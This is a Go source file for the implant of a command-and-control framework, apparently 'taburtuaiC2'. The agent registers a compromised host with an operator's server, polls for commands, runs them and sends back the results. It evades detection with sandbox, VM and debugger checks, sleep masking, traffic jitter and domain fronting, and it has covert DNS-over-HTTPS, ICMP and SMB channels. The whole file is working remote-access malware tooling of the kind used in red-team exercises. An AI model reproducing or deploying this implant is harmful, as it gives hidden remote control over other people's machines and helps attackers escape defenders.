package main

import (
	"bytes"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"runtime"
	"time"

	"github.com/mjopsec/taburtuaiC2/pkg/crypto"
	"github.com/mjopsec/taburtuaiC2/pkg/profiles"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

// AgentConfig holds all agent configuration baked in at build time
type AgentConfig struct {
	ServerURL    string
	PrimaryKey   string
	SecondaryKey string

	// Beacon timing
	Interval      int     // seconds
	JitterPercent int     // 0-100
	MaxRetries    int

	// Kill switch / schedule
	KillDate          string // YYYY-MM-DD; empty = never
	WorkingHoursOnly  bool
	WorkingHoursStart int // 24h hour, e.g. 8
	WorkingHoursEnd   int // 24h hour, e.g. 18

	// Evasion toggles
	EnableEvasion     bool
	SleepMasking      bool
	UserAgentRotation bool

	// Execution method baked in at build time
	// Supported: direct | cmd | powershell | wmi | mshta
	ExecMethod string

	// Malleable HTTP profile — controls URIs, headers, and User-Agent pool.
	Profile *profiles.C2Profile

	// Domain fronting — overrides the HTTP Host header while the TCP connection
	// still goes to ServerURL (the CDN front). Empty = no fronting.
	FrontDomain string

	// Alternative transport.  "http" (default) uses standard HTTP beaconing.
	// "doh"  — DNS-over-HTTPS via DoH resolver (pkg/transport/doh.go)
	// "icmp" — ICMP echo request/reply       (pkg/transport/icmp_windows.go)
	// "smb"  — SMB named pipe via relay      (pkg/transport/smb_windows.go)
	Transport   string
	DOHDomain   string // required when Transport=="doh"
	DOHProvider string // "cloudflare" | "google"
	SMBRelay    string // relay hostname/IP, required when Transport=="smb"
	SMBPipe     string // named pipe name on relay, default "svcctl"
}

// Agent is the main implant runtime
type Agent struct {
	ID        string
	cfg       *AgentConfig
	client    *http.Client
	crypto    *crypto.Manager   // static key manager (pre-ECDH)
	sessionMgr *crypto.Manager  // session key manager (post-ECDH); nil until handshake
	evasion   *EvasionManager
	timeGate  *TimeGate
	isRunning bool
}

// NewAgent constructs and optionally validates the environment
func NewAgent(cfg *AgentConfig) (*Agent, error) {
	cryptoMgr, err := crypto.NewManager(cfg.PrimaryKey, cfg.SecondaryKey)
	if err != nil {
		fmt.Printf("[!] Crypto init failed: %v\n", err)
		cryptoMgr = nil
	}

	var evasionMgr *EvasionManager
	if cfg.EnableEvasion {
		evasionMgr = NewEvasionManager(&EvasionConfig{
			EnableSandboxDetection:  true,
			EnableVMDetection:       true,
			EnableDebuggerDetection: true,
			UserAgentRotation:       cfg.UserAgentRotation,
			SleepMasking:            cfg.SleepMasking,
		})
		if !evasionMgr.PerformEvasionChecks() {
			return nil, fmt.Errorf("evasion checks failed — hostile environment detected")
		}
	}

	return &Agent{
		ID:        generateUUID(),
		cfg:       cfg,
		client:    &http.Client{Timeout: 60 * time.Second},
		crypto:    cryptoMgr,
		evasion:   evasionMgr,
		isRunning: false,
	}, nil
}

// activeCrypto returns the session manager if ECDH completed, otherwise the static one
func (a *Agent) activeCrypto() *crypto.Manager {
	if a.sessionMgr != nil {
		return a.sessionMgr
	}
	return a.crypto
}

// CollectInfo gathers basic system information for check-in
func (a *Agent) CollectInfo() types.AgentInfo {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	workDir, _ := os.Getwd()

	privileges := "user"
	if runtime.GOOS == "windows" {
		if _, err := os.Open("\\\\.\\PHYSICALDRIVE0"); err == nil {
			privileges = "admin"
		}
	} else if os.Geteuid() == 0 {
		privileges = "root"
	}

	return types.AgentInfo{
		ID:           a.ID,
		Hostname:     hostname,
		Username:     username,
		OS:           runtime.GOOS,
		Architecture: runtime.GOARCH,
		ProcessID:    os.Getpid(),
		Privileges:   privileges,
		WorkingDir:   workDir,
	}
}

// Checkin registers the agent with the server and performs ECDH if not yet done
func (a *Agent) Checkin() error {
	agentInfo := a.CollectInfo()

	// Build checkin payload
	payload := map[string]any{
		"id":           agentInfo.ID,
		"hostname":     agentInfo.Hostname,
		"username":     agentInfo.Username,
		"os":           agentInfo.OS,
		"architecture": agentInfo.Architecture,
		"process_id":   agentInfo.ProcessID,
		"privileges":   agentInfo.Privileges,
	}

	// Attach ephemeral ECDH public key if we don't have a session key yet
	var ecdhSession *crypto.ECDHSession
	if a.sessionMgr == nil {
		var err error
		ecdhSession, err = crypto.NewECDHSession()
		if err == nil {
			payload["ecdh_pub"] = ecdhSession.PubKeyB64
		}
	}

	body, err := a.marshalPayload(payload)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", a.cfg.ServerURL+a.profile().CheckinPath, bytes.NewBuffer(body))
	if err != nil {
		return err
	}
	a.setHeaders(req)

	resp, err := a.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("checkin failed: %d — %s", resp.StatusCode, string(b))
	}

	// Parse response for ECDH public key
	if ecdhSession != nil {
		var apiResp types.APIResponse
		if b, err := io.ReadAll(resp.Body); err == nil {
			if json.Unmarshal(b, &apiResp) == nil {
				if dataMap, ok := apiResp.Data.(map[string]any); ok {
					if serverPub, ok := dataMap["ecdh_pub"].(string); ok && serverPub != "" {
						sessionKey, err := ecdhSession.DeriveSessionKey(serverPub)
						if err == nil {
							a.sessionMgr, _ = crypto.NewManagerFromRawKey(sessionKey)
							fmt.Printf("[+] ECDH handshake complete — session key established\n")
						}
					}
				}
			}
		}
	}

	return nil
}

// GetNextCommand polls the server for the next pending command
func (a *Agent) GetNextCommand() (*types.Command, error) {
	url := a.cfg.ServerURL + a.profile().CommandPathForAgent(a.ID)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	a.setHeaders(req)

	resp, err := a.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent {
		return nil, nil
	}

	b, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	var apiResp types.APIResponse
	if err := json.Unmarshal(b, &apiResp); err != nil {
		return nil, fmt.Errorf("unmarshal API response: %v", err)
	}
	if !apiResp.Success {
		return nil, fmt.Errorf("server error: %s", apiResp.Error)
	}
	if apiResp.Data == nil {
		return nil, nil
	}

	var cmdData []byte
	if dataMap, ok := apiResp.Data.(map[string]any); ok {
		if enc, ok := dataMap["encrypted"].(string); ok && a.activeCrypto() != nil {
			decrypted, err := a.activeCrypto().DecryptData(enc)
			if err != nil {
				return nil, fmt.Errorf("decrypt command: %v", err)
			}
			cmdData = decrypted
		} else if result, ok := dataMap["result"].(map[string]any); ok {
			cmdData, _ = json.Marshal(result)
		} else {
			cmdData, _ = json.Marshal(dataMap)
		}
	} else {
		cmdData, _ = json.Marshal(apiResp.Data)
	}

	var cmd types.Command
	if err := json.Unmarshal(cmdData, &cmd); err != nil {
		return nil, fmt.Errorf("unmarshal command: %v", err)
	}
	if cmd.ID == "" {
		return nil, fmt.Errorf("command missing ID")
	}
	return &cmd, nil
}

// SubmitResult sends a command result back to the server
func (a *Agent) SubmitResult(result *types.CommandResult) error {
	body, err := a.marshalPayload(result)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", a.cfg.ServerURL+a.profile().ResultPath, bytes.NewBuffer(body))
	if err != nil {
		return err
	}
	a.setHeaders(req)

	resp, err := a.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("submit result failed: %d — %s", resp.StatusCode, string(b))
	}
	return nil
}

// beaconInterval returns the next sleep duration with jitter applied
func (a *Agent) beaconInterval() time.Duration {
	base := time.Duration(a.cfg.Interval) * time.Second
	if a.cfg.JitterPercent <= 0 {
		return base
	}
	jitterRange := int64(base) * int64(a.cfg.JitterPercent) / 100
	if jitterRange == 0 {
		return base
	}
	b := make([]byte, 8)
	rand.Read(b)
	// Map random bytes to [-jitterRange, +jitterRange]
	r := int64(b[0])<<56 | int64(b[1])<<48 | int64(b[2])<<40 | int64(b[3])<<32 |
		int64(b[4])<<24 | int64(b[5])<<16 | int64(b[6])<<8 | int64(b[7])
	jitter := (r % (jitterRange * 2)) - jitterRange
	result := base + time.Duration(jitter)
	if result < time.Second {
		result = time.Second
	}
	return result
}

// sleep performs the beacon sleep, using VirtualProtect masking on Windows when enabled
func (a *Agent) sleep(d time.Duration) {
	if a.cfg.SleepMasking {
		// Pass the active encryption key bytes as sensitive data to protect
		var sensitive []byte
		if mgr := a.activeCrypto(); mgr != nil {
			sensitive = mgr.PrimaryKeyBytes()
		}
		maskedSleep(d, sensitive)
	} else {
		time.Sleep(d)
	}
}

// Start runs the agent beacon loop, dispatching to the configured transport.
func (a *Agent) Start() error {
	a.isRunning = true
	fmt.Printf("[*] Agent %s starting — transport: %s, interval: %ds ±%d%%\n",
		a.ID, a.cfg.Transport, a.cfg.Interval, a.cfg.JitterPercent)

	// Dispatch to alternative transport if configured
	if t, err := a.newTransport(); err != nil {
		return fmt.Errorf("transport init: %w", err)
	} else if t != nil {
		return a.startCovertLoop(t)
	}

	// Initial checkin with retries
	for i := 0; i < a.cfg.MaxRetries; i++ {
		if err := a.Checkin(); err != nil {
			fmt.Printf("[!] Checkin attempt %d/%d failed: %v\n", i+1, a.cfg.MaxRetries, err)
			if i == a.cfg.MaxRetries-1 {
				return fmt.Errorf("initial checkin failed after %d attempts", a.cfg.MaxRetries)
			}
			a.sleep(10 * time.Second)
		} else {
			fmt.Printf("[+] Initial checkin successful\n")
			break
		}
	}

	for a.isRunning {
		// ── Kill date check ───────────────────────────────────────────────────
		if a.cfg.KillDate != "" {
			killDate, err := time.Parse("2006-01-02", a.cfg.KillDate)
			if err == nil && time.Now().After(killDate) {
				fmt.Printf("[*] Kill date %s reached — exiting\n", a.cfg.KillDate)
				return nil
			}
		}

		// ── Working hours check ───────────────────────────────────────────────
		if a.cfg.WorkingHoursOnly && a.cfg.WorkingHoursStart < a.cfg.WorkingHoursEnd {
			now := time.Now()
			h := now.Hour()
			if h < a.cfg.WorkingHoursStart || h >= a.cfg.WorkingHoursEnd {
				next := time.Date(now.Year(), now.Month(), now.Day(),
					a.cfg.WorkingHoursStart, 0, 0, 0, now.Location())
				if !now.Before(next) {
					next = next.Add(24 * time.Hour)
				}
				fmt.Printf("[*] Outside working hours — sleeping until %s\n", next.Format("15:04"))
				a.sleep(time.Until(next))
				continue
			}
		}

		// ── Poll + execute ────────────────────────────────────────────────────
		cmd, err := a.GetNextCommand()
		if err != nil {
			fmt.Printf("[!] GetNextCommand: %v\n", err)
		} else if cmd != nil {
			result := ExecuteCommand(a, cmd)
			if err := a.SubmitResult(result); err != nil {
				fmt.Printf("[!] SubmitResult: %v\n", err)
			}
		}

		// Periodic checkin to update LastSeen
		if err := a.Checkin(); err != nil {
			fmt.Printf("[!] Periodic checkin: %v\n", err)
		}

		a.sleep(a.beaconInterval())
	}
	return nil
}

// Stop halts the beacon loop
func (a *Agent) Stop() { a.isRunning = false }

// newTransport returns the BeaconTransport for the configured transport type.
// Returns nil when the transport is "http" (the default HTTP beacon loop is used).
func (a *Agent) newTransport() (BeaconTransport, error) {
	switch a.cfg.Transport {
	case "doh":
		if a.cfg.DOHDomain == "" {
			return nil, fmt.Errorf("DoH transport requires DOHDomain to be set")
		}
		return newDoHTransport(a.cfg.DOHDomain, a.ID, a.cfg.DOHProvider), nil
	case "icmp":
		return newICMPTransport(a.cfg.ServerURL, a.ID)
	case "smb":
		if a.cfg.SMBRelay == "" {
			return nil, fmt.Errorf("SMB transport requires SMBRelay to be set")
		}
		pipe := a.cfg.SMBPipe
		if pipe == "" {
			pipe = "svcctl"
		}
		return newSMBTransport(a.cfg.SMBRelay, pipe, a.ID)
	default:
		return nil, nil // use standard HTTP loop
	}
}

// startCovertLoop runs the beacon loop using an alternative transport.
// It mirrors the timing and kill-date logic of Start() but uses t.SendData /
// t.PollCommand instead of HTTP.
func (a *Agent) startCovertLoop(t BeaconTransport) error {
	// Initial registration — send agent info via covert channel
	info := a.CollectInfo()
	payload, err := a.marshalPayload(info)
	if err != nil {
		return fmt.Errorf("marshal checkin: %w", err)
	}
	for i := 0; i < a.cfg.MaxRetries; i++ {
		if err := t.SendData(payload); err != nil {
			fmt.Printf("[!] Covert checkin attempt %d/%d: %v\n", i+1, a.cfg.MaxRetries, err)
			if i == a.cfg.MaxRetries-1 {
				return fmt.Errorf("covert checkin failed after %d attempts", a.cfg.MaxRetries)
			}
			a.sleep(10 * time.Second)
		} else {
			fmt.Printf("[+] Covert checkin OK (%s)\n", a.cfg.Transport)
			break
		}
	}

	for a.isRunning {
		if a.cfg.KillDate != "" {
			if kd, err := time.Parse("2006-01-02", a.cfg.KillDate); err == nil && time.Now().After(kd) {
				fmt.Printf("[*] Kill date reached — exiting\n")
				return nil
			}
		}
		if a.cfg.WorkingHoursOnly && a.cfg.WorkingHoursStart < a.cfg.WorkingHoursEnd {
			now := time.Now()
			h := now.Hour()
			if h < a.cfg.WorkingHoursStart || h >= a.cfg.WorkingHoursEnd {
				next := time.Date(now.Year(), now.Month(), now.Day(),
					a.cfg.WorkingHoursStart, 0, 0, 0, now.Location())
				if !now.Before(next) {
					next = next.Add(24 * time.Hour)
				}
				a.sleep(time.Until(next))
				continue
			}
		}

		raw, err := t.PollCommand()
		if err != nil {
			fmt.Printf("[!] Covert poll: %v\n", err)
		} else if raw != nil {
			// Decrypt if needed
			var cmd types.Command
			if a.activeCrypto() != nil {
				dec, err := a.activeCrypto().DecryptData(string(raw))
				if err == nil {
					raw = dec
				}
			}
			if err := json.Unmarshal(raw, &cmd); err == nil && cmd.ID != "" {
				result := ExecuteCommand(a, &cmd)
				if rb, err := a.marshalPayload(result); err == nil {
					if err := t.SendData(rb); err != nil {
						fmt.Printf("[!] Covert send result: %v\n", err)
					}
				}
			}
		}
		a.sleep(a.beaconInterval())
	}
	return nil
}

// ── private helpers ───────────────────────────────────────────────────────────

// marshalPayload JSON-encodes v and encrypts with the static key.
// Always uses the static key (not the ECDH session key) so the server can
// decrypt with its CryptoMgr regardless of session state.
func (a *Agent) marshalPayload(v any) ([]byte, error) {
	raw, err := json.Marshal(v)
	if err != nil {
		return nil, err
	}
	if a.crypto == nil {
		return raw, nil
	}
	enc, err := a.crypto.EncryptData(raw)
	if err != nil {
		return raw, nil
	}
	wrapped, _ := json.Marshal(map[string]string{"encrypted_payload": enc})
	return wrapped, nil
}

// profile returns the active C2Profile, falling back to Default if unset.
func (a *Agent) profile() *profiles.C2Profile {
	if a.cfg.Profile != nil {
		return a.cfg.Profile
	}
	return profiles.Default()
}

// setHeaders applies the active profile's Content-Type, static headers, and
// User-Agent to req, then lets the evasion manager add further obfuscation.
func (a *Agent) setHeaders(req *http.Request) {
	p := a.profile()

	ct := p.ContentType
	if ct == "" {
		ct = "application/json"
	}
	req.Header.Set("Content-Type", ct)
	req.Header.Set("Accept", "application/json")

	// Apply profile-specific static headers
	for k, v := range p.Headers {
		req.Header.Set(k, v)
	}

	// User-Agent: profile pool > evasion manager > hardcoded fallback
	if len(p.UserAgents) > 0 {
		req.Header.Set("User-Agent", p.UserAgents[int(time.Now().UnixNano())%len(p.UserAgents)])
	} else if a.evasion != nil {
		a.evasion.ObfuscateHTTPTraffic(req)
	} else {
		req.Header.Set("User-Agent",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	}

	// Domain fronting: override HTTP Host header so the CDN routes the request
	// to the real C2 backend while the TLS SNI shows only the front domain.
	// req.Host takes precedence over the URL's host for the Host header.
	if a.cfg.FrontDomain != "" {
		req.Host = a.cfg.FrontDomain
	}
}
